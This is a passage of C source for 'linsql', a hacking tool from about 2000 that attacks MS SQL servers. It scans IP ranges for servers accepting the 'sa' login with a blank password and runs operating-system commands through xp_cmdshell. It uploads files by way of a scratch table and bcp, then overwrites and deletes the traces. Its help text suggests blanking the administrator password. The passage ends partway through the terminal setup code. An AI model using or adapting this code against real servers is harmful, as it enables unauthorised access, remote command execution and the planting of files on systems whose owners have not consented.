/*
 * linsql.c
 *
 * A simple command-line client for MS SQL server. Ha ha. This has grown into a bit of a monster now... thats evolution for you.
 * Designed for executing commands on the underlying operating system rather than performing SQL queries.
 * That said, it has the ability to perform SQL queries on the server.
 * Also added file upload system - usually works ;-) if it fails, try again.
 *
 * Setup to login as the user 'sa' with no password by default, although this can be changed.
 *
 * KNOWN BUGS
 * -=-=-=-=-=-
 *		- after queries that return no data, all further queries fail.Must restart linsql. Buggy TDS library.
 *		- same for illegal queries
 *		- the upload seems only to work every second try... needs investigation... looks like bugs in the internals of freeTDS.
 *
 * TO DO
 * -=-=-
 * 		- add a 'download' function to leech files from target server
 *		- perhaps migrate away from freeTDS to a stable library... if I can find a good open-source jobby
 *		- various aesthetics
 *		- tidy up some of the messy stuff, remove the redundant(duplicated) code
 *		- dictionar/brute-force password cracker
 *		- I'm sure I'll think of something else....
 *
 * INSTALLATION / COMPILATION
 * -=-=-=-=-=-=-=-=-=-=-=-=-=
 *
 * At present this is known to compile and run on GNU Linux systems - others may work...YMMV
 *
 * You'll need the FreeTDS version 0.50 available from http://www.freetds.org
 * Unpack theFreeTDS source. I have modified the code in the following way:
 *
 * freetds/src/tds/token.c line 133:
 *
 		default:
			fprintf(stderr,"Unknown marker: %d!!\n",marker);
			return 0;

 * replace with:

 		default:
			break;

 *
 * The above patch stops the freeTDS libraries from crashing when receiving invalid data (most of the time).
 * Now build the libraries - see the INSTALL file that comes in the tarball.
 * I recommend copying the compiled freeTDS libraries into your /usr/local/lib directory and running ``ldconfig''
 * If you don't do this, you'll need to tell GCC where the libraries are installed using the ``-L'' parameter
 * Next, compile linsql:
 *
 * 		gcc -o linsql linsql.c -ltds -lncurses
 *
 *				OR
 *
 *		gcc -o linsql linsql.c -L<path-to-TDS-libraries> -ltds -lncurses
 *
 * Use the first line if you've copied the freeTDS libs into /usr/local/lib
 * use the second line if you've left the libraries in the standard freetds post-installation directory
 *  
 * Written by Herbless - all ideas, code and bugs are mine.
 *
 * Last updated 07/08/2K
 *
 */

#include "../freetds/include/tds.h"	// change this if you installed the TDS include files somewhere else
#include <stdio.h>
#include <unistd.h>
#include <stdarg.h>
#include <termios.h>
#include <curses.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#define MAX_BUF_SIZE 256
#define MAX_NUM_DBS 128
#define MAX_INPUT_LEN 8192						// change this for a larger input buffer in interactive mode
#define MAX_INPUT_LEN_UPPER_BOUNDS 50000000		// maximum ceiling available for input buffer is 50Megs. Enough ?
#define CMD_PADDING 20
#define __PROMPT__ "linsql > "
#define UPKEY -1
#define DOWNKEY -2
#define LEFTKEY -3
#define RIGHTKEY -4
#define BACKSPACE -5
#define MAX_COMMANDS 128
#define STATUS_FILE "__linsql__scanfile__temp__"

/***********************************************************************************
 * the structures we don't really need to use but do because they keep things tidy
 ***********************************************************************************/
struct
{
	int verbose;
	int probe;
	int interactive;
	int username;
	int password;
	int app;
	int charset;
	int language;
	int hostname;
	int loginID;
	int test;
	int log;
	int scan;
} opt;
struct
{
	char IP[MAX_BUF_SIZE];
	char loginID[MAX_BUF_SIZE];
	char password[MAX_BUF_SIZE];
	char app[MAX_BUF_SIZE];
	char hostname[MAX_BUF_SIZE];
	char charset[MAX_BUF_SIZE];
	char language[MAX_BUF_SIZE];
	char logfile[MAX_BUF_SIZE];
} target;

/***********************************************************************************
 * declare the function prototypes
 ***********************************************************************************/
void set_target_defaults();
char *value_as_string(TDSSOCKET  *tds,int col_idx);
void display_help();
void get_input_string(char *input);
void execute_query(char *query);
void execute_query2(char *query);
void display_db_list();
int do_local_command(char *buf);
void display_table_list();
void print_it(char *s, ...);
void display_options();
void upload_file(char *fname, char *path);
void list_stored_procedures();
void list_columns_in_table(char *query);
int get_key();
int get_string(char *buffer, int maxCount);
void setup_terminal();							// always call this first
void close_terminal();							// always call this before you exit() your program
void scan_hosts(char *iprange,int cTimeout, int pTimeout, char *givenName);		// scan for vulnerable hosts
void scan_from_file(FILE *ipFilePtr, int cTimeout, int pTimeout, char *givenName);
int probe_login(char *ip);
void scan_a_host(int, struct sockaddr_in *, char *, char *, int, int);

/***********************************************************************************
 * mmmm, luvvly global variables. it's an easy life....
 ***********************************************************************************/
char *inputBuf, *execCmd,*backSpaceSequence, *cteol, *home, *commandBuf[MAX_COMMANDS];
int inputBufSize=MAX_INPUT_LEN,numCommands=0;
TDSLOGIN *login;
TDSSOCKET *tds;
FILE *logfileFP;
struct termios init_settings, new_settings;

/***********************************************************************************
 * the good old main() function
 ***********************************************************************************/
main(int argc,char **argv)
{
	int  i, invalidArg=0, currArg=1, exitFlag=0, maxx, maxy,x,y, timeout, probeTimeout;
	char *arg,*processName;


/*
 * setup the default values
 */
	memset((void *)&opt,0,sizeof(opt));
	memset((void *)&target,0,sizeof(target));
	processName=argv[0];
	
/*
 * check to see if we were passed arguments. If not, display short help screen and bail out
 */
	if(argc==1)
	{
		printf("linsql -- by Herbless -- July 2K\n");
		printf("Syntax:\n");
		printf("   -i <IP address>           Specify target IP\n");
		printf("   -c                        Command-line interactive mode\n");
		printf("   -v                        Be verbose (recommended)\n");
		printf("   -p                        Probe for default password and exit.\n");
		printf("   -u <username>             Specify username\n");
		printf("   -P <password>             Specify password\n");
		printf("   -a <appname>              Give application name\n");
		printf("   -C <charset>              Specify charset\n");
		printf("   -l <language>             Choose language\n");
		printf("   -h <hostname>             Give client hostname\n");
		printf("   -L <logname>              Log all I/O to <logname> in append mode\n");
		printf("   -s <IP range> [ct] [pt]   Scan for vulnerable hosts\n");
		printf("                             <IP range> can be either the name of a file containing a list of hosts or\n");
		printf("                             a range of IP addresses in the format a.b.c.d-e or a.b.c-d.e-f etc.\n");
		printf("                             Connect with timeout of [ct] seconds (optional. Default=4)\n");
		printf("                             Login probe timeout at [pt] seconds (optional. Default=10)\n");
		printf("   -t                        Test mode. Used for debugging with no remote connection.\n\n");
		printf("Examples:\n");
		printf("   linsql -c -v -i 192.168.0.1             Connect to host 192.168.0.1 with username 'sa'\n");
		printf("                                           and the default blank password. If login is\n");
		printf("                                           successful, gives a command prompt.\n\n");
		printf("   linsql -p -i 192.168.0.1                Probes 192.168.0.1 and reports if logon succeeded.\n\n");
		printf("   linsql -s myIPlist.txt                  Scans all the hosts in the file \"myIPlist.txt\"\n");
		printf("   linsql -s 192.168.0.1-10                Scans the hosts 192.168.0.1 - 192.168.0.10\n");
		printf("                                           and displays the ones where login was successful.\n\n");
		exit(1);
	}
	
/*
 * parse all the arguments passed from the shell. I could have used getopt(), but hey, this works ;-)
 */
	argv++;
	while(*argv!=NULL&&invalidArg==0)
	{
		arg=*(argv++);
		if(arg[0]=='-')
		{
			switch(arg[1])
			{
				case 'i':										// get IP address
					arg=*(argv++);
					strncpy(target.IP,arg,MAX_BUF_SIZE);
					break;
				case 'p':										// set probe mode
					opt.probe=1;
					break;
				case 'c':										// set interactive mode
					opt.interactive=1;
					break;
				case 'v':										// set the verbose mode
					opt.verbose=1;
					break;
				case 't':
					opt.test=1;
					break;
				case 'u':										// change the login name (default 'sa')
					arg=*(argv++);
					strncpy(target.loginID,arg,MAX_BUF_SIZE);
					opt.username=1;
					break;
				case 'P':										// specify a password (default is blank)
					arg=*(argv++);
					strncpy(target.password,arg,MAX_BUF_SIZE);
					opt.password=1;
					break;
				case 'a':										// specify application to pretend to be
					arg=*(argv++);
					strncpy(target.app,arg,MAX_BUF_SIZE);
					opt.app=1;
					break;
				case 'C':										// change character set (default us_english)
					arg=*(argv++);
					strncpy(target.charset,arg,MAX_BUF_SIZE);
					opt.charset=1;
					break;
				case 'l':										// change language (default iso_1)
					arg=*(argv++);
					strncpy(target.language,arg,MAX_BUF_SIZE);
					opt.language=1;
					break;
				case 'h':										// give client hostname (default mypc)
					arg=*(argv++);
					strncpy(target.hostname,arg,MAX_BUF_SIZE);
					opt.hostname=1;
					break;
				case 'L':										// do we want logging turned on
					arg=*(argv++);
					strncpy(target.logfile,arg,MAX_BUF_SIZE);
					opt.log=1;
					break;
				case 's':
					if(argc < 3)
						printf("You must at least specify an IP address, IP range or filename.\n");
					arg=*(argv++);
					if(*argv!=NULL && **argv!='-')
					{
						timeout=atoi(*(argv++));
						if(*argv!=NULL && **argv!='-')
						{
							probeTimeout=atoi(*(argv++));
						}
						else
							probeTimeout=10;
					}
					else
					{
						timeout=4;
						probeTimeout=10;
					}
					strncpy(target.IP, arg,MAX_BUF_SIZE);
					opt.scan=1;
					break;
				default:										// any other commandline args are invalid
					invalidArg=1;
					break;
			}
		}
		else
			invalidArg=1;
		currArg++;
	}

/*
 * make sure all is OK with the passed arguments
 */	
	if(invalidArg)
	{
		printf("Invalid argument - '%s'\n", arg);
		exit(1);
	}
	if(target.IP[0]==0)
	{
		printf("If you want to connect you must give an IP!\n");
		exit(1);
	}
	if(opt.probe&&opt.interactive)
	{
		printf("It makes no sense to probe in interactive mode. Choose only one.\n");
		exit(1);
	}
	if(opt.log)
	{
		if((logfileFP=fopen(target.logfile,"wa"))==NULL)
		{
			printf("Could not write to logfile \"%s\"\n",target.logfile);
			exit(1);
		}
	}
	if(opt.probe==0&&opt.interactive==0)
	{
		opt.probe=1;
		if(opt.verbose)
			print_it("- No connect mode given. Assuming probe mode.\n");
	}
	if(opt.verbose)
		display_options();
	
/*
 * setup the call to connect()
 */					
	set_target_defaults();
/*
 * display messages in verbose mode
 */	
	if(opt.verbose&&opt.probe)
		print_it("- Probing target [%s]...\n", target.IP);
    else
    if(opt.verbose&&opt.interactive)
    	print_it("- Attempting interactive command-prompt mode with [%s]...\n",target.IP);
	
/*
 * is this a mass scan?
 */	
	if(opt.scan==1)
	{
		print_it("Scanning %s with connect timeout=%d secs, probe timeout=%d secs.\n",arg, timeout, probeTimeout);
		scan_hosts(target.IP, timeout, probeTimeout, processName);
		exit(0);
	}
/*
 * Attempt to login to server
 */		
	if(opt.test==0)
		if((tds = tds_connect(login))==NULL)
		{
			tds_free_login(login);
			if(opt.verbose)
				print_it("- Login to [%s] failed.\n", target.IP);
			exit(1);
		}

/*
 * Success... we're logged into the SQL server. We can have our wicked way :)
 *
 * call this function to initialize my little keyboard routines
 */
	setup_terminal();
	
	if(opt.verbose)
		print_it("- Login to [%s] succeeded %s\n", target.IP,(opt.test==1)?"(TEST MODE)":"");
	else
	if(opt.probe)
		print_it("*** Login to [%s] succeeded %s ***\n", target.IP,(opt.test==1)?"(TEST MODE)":"");

 	if(opt.interactive)
	{
		if(opt.verbose)
			print_it("- Entering interactive mode. Remember this isn't a shell.\n");
		if((inputBuf=(char *)malloc(MAX_INPUT_LEN))==NULL)
		{
			print_it("Out of memory allocating input buffer\n");
			exit(1);
		}
		if((execCmd=(char *)malloc(MAX_INPUT_LEN+CMD_PADDING))==NULL)
		{
			printf("Out of memory allocating command buffer with padding\n");
			exit(1);
		}
		print_it("Type /h or /? for help\n");
		
		/*
		 * this is the command-line code
		 */
		while(exitFlag==0)
		{
			memset(inputBuf,0,MAX_INPUT_LEN);
			print_it(__PROMPT__);
			fflush(stdout);								// needed, for prompt to be displayed without adding a cr/lf pair after it
			get_string(inputBuf,MAX_INPUT_LEN);			// read command from keyboard
			if(inputBuf[0]=='/')						// is it a local command ?
				exitFlag=do_local_command(inputBuf);
			else
			if(inputBuf[0]!='\0')	// valid buffer ?
			{			
				strcpy(execCmd, "xp_cmdshell '"); // cheap n cheerful way to build query string without escaping/formatting it
				strcat(execCmd, inputBuf);
				strcat(execCmd, "'");
				if(opt.verbose)
					print_it("\nExecuting [%s]\n",execCmd);
				else
					print_it("\n");
				execute_query(execCmd);
			}
			else
				printf("\n");
		}
    }
/*
 * tidy up and exit cleanly
 */
    if(opt.verbose)
    	print_it("- Tearing down the connection...\n");
    if(opt.test==0)
	    tds_free_socket(tds);
	tds_free_login(login);
	if(opt.verbose)
	{
		print_it("- Disconnected\n");
		print_it("- Freeing dynamic memory...\n");
	}
	free(execCmd);
	free(inputBuf);
	if(opt.verbose)
    	print_it("- All done. Have a nice day!\n");
	
	close_terminal();
	exit(0);
}

/***********************************************************************************
 * functions go here.....
 ***********************************************************************************/

/*
 * guess what this does
 */
void display_options()
{
	print_it("- Using options:\n");
	print_it("\tTarget IP: %s\n", target.IP);
	if(opt.probe)		print_it("\tProbe mode\n");
	if(opt.interactive)	print_it("\tInteractive mode\n");
	if(opt.username)	print_it("\tUsername (login) \"%s\"\n",target.loginID);
	if(opt.password)	print_it("\tPassword ******\n");
	if(opt.hostname)	print_it("\tHostname \"%s\"\n",target.hostname);
	if(opt.app)			print_it("\tApplication name \"%s\"\n",target.app);
	if(opt.language)	print_it("\tLanguage \"%s\"\n",target.language);
	if(opt.charset)		print_it("\tCharset \"%s\"\n",target.charset);
	if(opt.log)			print_it("\tLogging to file \"%s\"\n",target.logfile);
	if(opt.test)		print_it("\tTest mode - no connect()\n");
}

/*
 * duh, guess what this does
 */
void display_help()
{
	print_it("\nlinsql -- by Herbless -- July 2K\n");
	print_it("All local commands begin with a '/' character.\n\n");
	print_it("  /? or /h         - This guff\n");
	print_it("  /s <COMMAND>     - Send COMMAND as a literal string to the SQL server.\n");
	print_it("                     Can be used to perform SELECT queries etc.\n");
	print_it("                     Eg. /s SELECT * FROM foo WHERE bar=\"boz\"\n");
	print_it("  /u <DATABASE>    - Use DATABASE as the active database.\n");
	print_it("  /d               - Display a list of databases held on server\n");
	print_it("  /t               - Display a list of tables in current database\n");
	print_it("  /v               - Toggle verbose mode\n");
	print_it("  /l               - Toggle logging mode\n");
	print_it("  /L <FILENAME>    - Change logfile to FILE\n");
	print_it("  /o               - Display current options\n");
	print_it("  /a <BUFFERSIZE>  - Allocate BUFFERSIZE bytes for input buffer. %d is current size.\n", inputBufSize);
	print_it("  /U <FILE> <DEST> - Upload local FILE to remote DEST directory.\n");
	print_it("                     Eg. /U myfile.txt c:\\temp\n");
	print_it("  /p               - Print a list of the stored procdures on the server\n");
	print_it("  /c               - Display the columns in the given the table.\n");
	print_it("  /q               - Disconnect and quit\n\n");
	print_it("Anything else will be passed to the 'xp_cmdshell' stored procedure and executed by the OS.\n");
	print_it("So, you could issue a 'net user administrator \"\"' command for example.\n");
	print_it("Note that you cannot use the ' character as it is the SQL query delimiter. Use \" instead.\n\n");
}

/*
 * interpret and act upon '/' local commands
 */
int do_local_command(char *buf)
{
	char *ptr, *fptr, *pptr, fname[MAX_BUF_SIZE], path[MAX_BUF_SIZE];
	int exitFlag=0, newSize;
	
	if(buf[1]=='q')					// bail out
		exitFlag=1;
	else
	if(buf[1]=='?'||buf[1]=='h')	// display help
		display_help();
	else
	if(buf[1]=='s')					// execute a MS-SQL server command, not an operating system one
	{
		if(strlen(buf)>3)
		{
			strcpy(execCmd,buf+3);
			if(opt.verbose)
				print_it("\nExecuting [%s]\n",execCmd);
			execute_query(execCmd);
		}
		else
			print_it("\nYou must specify a command to execute!\n");
	}
	else
	if(buf[1]=='d')					// show databases
		display_db_list();
	else
	if(buf[1]=='t')					// show tables in database
		display_table_list();
	else
	if(buf[1]=='l')					// toggle logging on/off
	{
		opt.log=1-opt.log;
		if(opt.log)
		{
			if((logfileFP=fopen(target.logfile,"wa"))==NULL)
			{
				print_it("Failed to open the logfile \"%s\" in append mode.\n",target.logfile);
				opt.log=0;
			}
		}
		else
			fclose(logfileFP);
		print_it("Logging %s\n", (opt.log==1)?"on":"off");
	}			
	else
	if(buf[1]=='o')					// show the current options
	{
		display_options();
	}
	else
	if(buf[1]=='L')					// change log file
	{
		if(opt.log)
			fclose(logfileFP);
		strncpy(target.logfile, buf+3, MAX_BUF_SIZE);
		opt.log=1;
		if((logfileFP=fopen(target.logfile,"wa"))==NULL)
		{
			print_it("Failed to open the logfile \"%s\" in append mode.\n",target.logfile);
			opt.log=0;
		}
		else
			print_it("Log file changed to \"%s\"\n",target.logfile);
		print_it("Logging %s\n", (opt.log==1)?"on":"off");
	}
	else
	if(buf[1]=='u')					// change current db
	{
		if(strlen(buf)>3)
		{
			strcpy(execCmd, "use ");
			strcat(execCmd,buf+3);
			if(opt.verbose)
				print_it("\nExecuting [%s]\n",execCmd);
			execute_query(execCmd);
		}
		else
			print_it("\nYou must specify database to make active!\n");
	}
	else
	if(buf[1]=='v')				    // toggle verbose mode
	{
		opt.verbose=1-opt.verbose;
		
		print_it("\nVerbose mode %s\n",(opt.verbose==0)?"off":"on");
	}
	else
	if(buf[1]=='a')					// change size of allocated input buffer
	{
		if(strlen(buf)>3)
		{
			newSize=atoi(buf+3);
			if(newSize < 8192 || newSize > MAX_INPUT_LEN_UPPER_BOUNDS)
				print_it("The size %d is out of bounds.\nChoose a buffer between %d and %d bytes\n", newSize,MAX_INPUT_LEN,MAX_INPUT_LEN_UPPER_BOUNDS);
			else
			{
				inputBufSize=newSize;
				if((ptr=(char *)realloc(inputBuf, inputBufSize))==NULL)
					print_it("Not enough memory for that input buffer.\nKeeping original buffer size.");
				else
				{
					inputBuf=ptr;
					print_it("Allocated %d bytes for input buffer\n",inputBufSize);
				}
				if((ptr=(char *)realloc(execCmd, inputBufSize+CMD_PADDING))==NULL)
				{
					print_it("Not enough memory for the exec buffer.\nKeeping original buffer size.");
					inputBuf=(char *)realloc(inputBuf,MAX_INPUT_LEN); // if the execCmd buffer alloc fails, we have to realloc the inputBuf also
				}
				else
				{
					execCmd=ptr;
					print_it("Allocated %d bytes for exec buffer\n", inputBufSize+CMD_PADDING);
				}
			}
		}
		else
			print_it("You must specify a new size in bytes\n");
	}					
	else
	if(buf[1]=='U')		// do file upload
	{
		ptr=buf+2;
		if(*ptr!=' ')
		{
			print_it("Invalid upload\n");
			return exitFlag;
		}
		fptr=fname;
		pptr=path;
		while(*ptr==' ') 					// skip blanks after '/U'
			ptr++;
		while(*ptr!=' '&&*ptr!='\0')		// copy filename into buffer
			*(fptr++)=*(ptr++);
		if(*ptr!=' ')						// make sure there is something after the filename
		{
			print_it("Invalid upload\n");
			return exitFlag;
		}
		ptr++;
		while(*ptr!=' '&&*ptr!='\0')		// copy path for dest file on remote server into buffer
			*(pptr++)=*(ptr++);
		*fptr='\0';							// null terminate the buffers
		*pptr='\0';
		upload_file(fname, path);			// upload it! remember the filename is local and may contain directoty parameters...
	}
	else
	if(buf[1]=='p')		// give a list of the stored procedures in the current database
	{
		list_stored_procedures();
	}
	else
	if(buf[1]=='c')		// show the fields in a given table
	{
		if(strlen(buf)>3)
		{
			strcpy(execCmd, "sp_columns ");
			strcat(execCmd,buf+3);
			if(opt.verbose)
				print_it("\nExecuting [%s]\n",execCmd);
			list_columns_in_table(execCmd);
		}
		else
			print_it("\nYou must specify a table to to be able to list the columns\n");
	}
	else
		print_it("\nOut of cheese error - redo from start.\n");	// invalid local command
	
	return exitFlag;
}


/*
 * send a prepared query to the MS SQL server
 * display all output nicely on the screen
 * gets messy with lines wider than the terminal width. to be fixed :)
 * the function is from the FreeTDS example code with some changes
 */
void execute_query(char *query)
{
	int i, rowc=999,resultc=999, row, count=0, gotInside=0;
	
	if(opt.test==0)
	{
		//print_it("*** calling tds_submit_query() ***\n");fflush(stdout);
		if(tds_submit_query(tds,query)==TDS_FAIL)
		{
			if(opt.verbose)
				printf("TDS FAIL on tds_submit_query()\n");
			return;
		}
		//print_it("*** Entering first loop ***\n");
		while((resultc=tds_process_result_tokens(tds))==TDS_SUCCEED)
		{
			gotInside=1;
			//print_it("*** Entering second loop ***\n");
			while((rowc=tds_process_row_tokens(tds))==TDS_SUCCEED)
			{
				for (i=0; i<tds->res_info->num_cols; i++)
					print_it("[%s] - %s\n", tds->res_info->columns[i]->column_name,value_as_string(tds, i));
				count++;
			}
		}
		if(count==0)
			if(opt.verbose)
				print_it("resultc=%d, rowc=%d,gotInside=%d\n",resultc,rowc,gotInside);
	}
}

/*
 * use an 'sp_tables' stored procedure call to get a list of tables in the current database
 * will fail with unpredictable results if the procedure doesn't exist
 */
void display_table_list()
{
	int i, resultc=999,rowc=999, row, count=0,gotInside=0;
	
	if(opt.test==0)
	{
		printf("\n");		
		if(tds_submit_query(tds,"sp_tables")==TDS_FAIL)
		{
			if(opt.verbose)
				printf("TDS FAIL on tds_submit_query()\n");
			return;
		}
		while((resultc=tds_process_result_tokens(tds))==TDS_SUCCEED)
		{
			gotInside=1;
			while((rowc=tds_process_row_tokens(tds))==TDS_SUCCEED)
			{
				for(i=0; i<tds->res_info->num_cols; i++)
					if(strcmp(tds->res_info->columns[i]->column_name, "TABLE_NAME")==0)
						print_it("\n%s",value_as_string(tds, i));
				count++;
			}
		}
		printf("\n\n");
	}
}

/*
 * use an 'sp_databases' stored procedure call to get a list of databases from the server
 * will fail with unpredictable results if the procedure doesn't exist
 */
void display_db_list()
{
	int i, resultc=999,rowc=999, row, count=0,gotInside=0;
	
	if(opt.test==0)
	{
		printf("\n");
		if(tds_submit_query(tds,"sp_databases")==TDS_FAIL)
		{
			if(opt.verbose)
				printf("TDS FAIL on tds_submit_query()\n");
			return;
		}
		while((resultc=tds_process_result_tokens(tds))==TDS_SUCCEED)
		{
			gotInside=1;
			while((rowc=tds_process_row_tokens(tds))==TDS_SUCCEED)
			{
				for(i=0; i<tds->res_info->num_cols; i++)
					if(strcmp(tds->res_info->columns[i]->column_name, "")==0||strcmp(tds->res_info->columns[i]->column_name, "DATABASE_NAME")==0)
						print_it("\n%s",value_as_string(tds, i));
				count++;
			}
		}
		printf("\n\n");		
	}
}

/*
 * get a string and chop off the new-line added by the dumb-ass fgets(...)
 */
void get_input_string(char *input)
{
	memset(input, 0, MAX_INPUT_LEN);
	fgets(input, MAX_INPUT_LEN-1,stdin);
	input[strlen(input)-1]='\0';
}
	

/*
 * setup the initial values for the connection parameters
 * these may be changed by arguments on the commandline
 */
void set_target_defaults()
{
	strncpy(target.loginID,"sa",MAX_BUF_SIZE);
	strncpy(target.password,"",MAX_BUF_SIZE);
	strncpy(target.language,"us_english",MAX_BUF_SIZE);
	strncpy(target.charset,"iso_1",MAX_BUF_SIZE);
	strncpy(target.hostname,"mypc",MAX_BUF_SIZE);
	strncpy(target.app,"Microsoft Access",MAX_BUF_SIZE);
	login = tds_alloc_login();
	tds_set_passwd(login,target.password);
	tds_set_user(login,target.loginID);
	tds_set_app(login,target.app);
	tds_set_host(login,target.hostname);
	tds_set_library(login,"TDS-Library");
	tds_set_charset(login,target.charset);
	tds_set_language(login,target.language);
	tds_set_server(login,target.IP);
	tds_set_packet(login,512);
}

/*
 * This function plucked straight from the FreeTDS example code
 * modified to display strings as the default value instead of an error message
 */
char *value_as_string(TDSSOCKET  *tds,int col_idx)
{
   static char  result[256];
   const int    type    = tds->res_info->columns[col_idx]->column_type;
   const char  *row     = tds->res_info->current_row;
   const int    offset  = tds->res_info->columns[col_idx]->column_offset;
   const void  *value   = (row+offset);

   switch(type)
   {
      case SYBVARCHAR:
      {
         strncpy(result, (char *)value, sizeof(result)-1);
         result[sizeof(result)-1] = '\0';
         break;
      }
      case SYBINT4:
      {
         sprintf(result, "%d", *(int *)value);
         break;
      }
      default:
      {
         strncpy(result, (char *)value, sizeof(result)-1);
         result[sizeof(result)-1] = '\0';
	//strcpy(result, "NotImp");
         break;
      }
   }
   return result;
}

/*
 * an upgraded printf() that can handle logging..
 * writes to stdout and, if necessary, the log file
 */
void print_it(char *s, ...)
{
	va_list ap;
	
	va_start(ap, s);
	vprintf(s, ap);
	if(opt.log&&logfileFP!=NULL)
		vfprintf(logfileFP,s,ap);
	va_end(ap);
}

/*
 * upload a file from the local filesystem to the remote machine
 * known to be buggy: fails on every second attempt
 */
void upload_file(char *fname, char *path)
{
	FILE *fp;
	unsigned char *uploadBuf, buf[10], *ptr, *fptr;
	int start, end, size, verboseSave, i, ch;
	
	print_it("*** Beginning file upload ***\n");

/*
 * first, before I forget, strip out the directory path from the given filename so things don't get fucked up later.
 * at the end of the loop fptr will point to a bare filename. path will have any trailing slashes dropped
 */
	size=strlen(fname);
	ptr=fname+size;
	while(size--)
	{
		if(*ptr=='/')
		{
			fptr=ptr+1;
			break;
		}
		ptr--;
	}
	if(size<=0)
		fptr=ptr;
	if(path[strlen(path)-1]=='\\')	// chop any trailing slashes entered by dumb haxors ;)
		path[strlen(path)-1]='\0';

	verboseSave=opt.verbose;
	opt.verbose=0;				// stop execute_query() from shouting about what it's doing. makes things neater
	
	print_it("- opening file to upload...\n");
	if((fp=fopen(fname,"r"))==NULL)
	{
		print_it("Cannot open \"%s\"\nUpload failed\n", fname);
		return;
	}
	start=ftell(fp);	// should always be zero
	fseek(fp,0,SEEK_END);
	end=ftell(fp);		// should be last byte of file.
	fseek(fp,0,SEEK_SET);
	size=end-start;		// get size of file

    i=256+(size*2)+(CMD_PADDING*2);
	print_it("- allocating memory (%d bytes) for file of size %d bytes...\n",i, size);
	uploadBuf=(unsigned char *)malloc(i);		// scrappy memory alloc should work in most cases :)
	if(uploadBuf==NULL)
	{
		printf("Not enough memory. Get a proper computer\nUpload failed\n");
		fclose(fp);
		return;
	}
	
	print_it("- using master database\n");
	execute_query("use master");
	
	print_it("- dropping any old haxortable's\n");
	execute_query("drop table haxortable");
	
	print_it("- creating table \"haxortable\"\n");
	execute_query("create table haxortable (upload image)");
		
	print_it("- building query string to insert file into table...\n");
	strcpy(uploadBuf, "insert into haxortable (upload) values(0x");	// start the query string
	i=0;
	ptr=uploadBuf+strlen(uploadBuf);
	do
	{
		if(fread(&ch,1,1,fp))
		{													// read byte from file
			sprintf(buf, "%2x", ch);						// convert to hex pair
			if(buf[0]==' ')									// make sure its a pair for single digits
				buf[0]='0';
			*(ptr++)=buf[0];								// tag it on the end of the query string
			*(ptr++)=buf[1];
		}
	}while(!feof(fp));
	*(ptr++)=')';
	*(ptr++)='\0';											// finish the query string
	fclose(fp);
	
	print_it("- insert the file into the temporary table...\n");
	execute_query(uploadBuf);											// stuff the file into the table
	print_it("- build a file for redirecting bcp commands");fflush(stdout);
	execute_query("xp_cmdshell 'echo.> c:\\temp\\bcp.cmd'");print_it(".");fflush(stdout);
	execute_query("xp_cmdshell 'echo 0 >> c:\\temp\\bcp.cmd'");print_it(".");fflush(stdout);
	execute_query("xp_cmdshell 'echo.>> c:\\temp\\bcp.cmd'");print_it(".");fflush(stdout);
	execute_query("xp_cmdshell 'echo.>> c:\\temp\\bcp.cmd'");print_it(".\n");fflush(stdout);
	
	print_it("- 'bcp' the file out of the database...\n");
    sprintf(uploadBuf, "xp_cmdshell 'type c:\\temp\\bcp.cmd | bcp haxortable out %s\\%s -U %s -P %s > nul'",path,fptr,target.loginID,target.password);
	execute_query(uploadBuf);

	print_it("*** Wooha! File uploaded to server. Time to cleanup ***\n");
	
	print_it("- removing bcp command file...\n");
	execute_query("xp_cmdshell 'echo aaaaaaaaaaaaaaaaa > c:\\temp\\bcp.cmd'");	// overwrite the file with junk
	execute_query("xp_cmdshell 'del c:\\temp\\bcp.cmd'");
		
	print_it("- drop haxortable\n");
	execute_query("drop table haxortable");
	
	print_it("*** All done. \"%s\" should now be on the remote server in \"%s\" ***\n",fptr,path);
	
	
	free(uploadBuf);			// remember to free the memory
	
/*
 * this is a kludge, cos the tds_query routine fucks up with null return strings
 */
	print_it("- Reconnecting as a kludge to fix broken TDS library...\n");
	if(opt.test==0)
	    tds_free_socket(tds);
	tds_free_login(login);

	login = tds_alloc_login();
	tds_set_passwd(login,target.password);
	tds_set_user(login,target.loginID);
	tds_set_app(login,target.app);
	tds_set_host(login,target.hostname);
	tds_set_library(login,"TDS-Library");
	tds_set_charset(login,target.charset);
	tds_set_language(login,target.language);
	tds_set_server(login,target.IP);
	tds_set_packet(login,512);
	
	if(opt.test==0)
		if((tds = tds_connect(login))==NULL)
		{
			tds_free_login(login);
			if(opt.verbose)
				print_it("- Reconnect to [%s] failed.\n", target.IP);
			exit(1);
		}
	print_it("- Kludge complete\n");
/*
 * end of kludge
 */
	
	opt.verbose=verboseSave;	
}
			
/*
 * give a list of the stored procedures that are handled by the remote system
 */
void list_stored_procedures()
{
	int i, resultc=999,rowc=999, row, count=0,gotInside=0;
	
	if(opt.test==0)
	{
		printf("\n");		
		if(tds_submit_query(tds,"sp_help")==TDS_FAIL)
		{
			if(opt.verbose)
				printf("TDS FAIL on tds_submit_query()\n");
			return;
		}
		while((resultc=tds_process_result_tokens(tds))==TDS_SUCCEED)
		{
			gotInside=1;
			while((rowc=tds_process_row_tokens(tds))==TDS_SUCCEED)
			{
				for(i=0; i<tds->res_info->num_cols; i++)
					if(strcmp(tds->res_info->columns[i]->column_name, "Name")==0)
						print_it("%s\n",value_as_string(tds, i));
				count++;
			}
		}
		printf("\n");
	}
}

/*
 * does exactly what it says on the box
 */
void list_columns_in_table(char *query)
{
	int i, resultc=999,rowc=999, row, count=0,gotInside=0;
	
	if(opt.test==0)
	{
		printf("\n");		
		if(tds_submit_query(tds,query)==TDS_FAIL)
		{
			if(opt.verbose)
				printf("TDS FAIL on tds_submit_query()\n");
			return;
		}
		while((resultc=tds_process_result_tokens(tds))==TDS_SUCCEED)
		{
			gotInside=1;
			while((rowc=tds_process_row_tokens(tds))==TDS_SUCCEED)
			{
				for(i=0; i<tds->res_info->num_cols; i++)
					if(strcmp(tds->res_info->columns[i]->column_name, "COLUMN_NAME")==0)
						print_it("%s\n",value_as_string(tds, i));
				count++;
			}
		}
		printf("\n");
	}
}

/*
 * uninitialize the curses stuff, then free all the memory allocated for the command history
 */
void close_terminal()
{
	tcsetattr(fileno(stdin),TCSANOW, &init_settings);
	while(numCommands--)
		free(commandBuf[numCommands]);
}

/*
 * setup the curses stuff
 */
void setup_terminal()
{
	setupterm(NULL, fileno(stdout), (int *)0);
	tcgetattr(fileno(stdin), &init_settings);
	new_settings=init_settings;
	new_settings.c_lflag &= ~ICANON;
	new_settings.c_lflag &= ~ECHO;
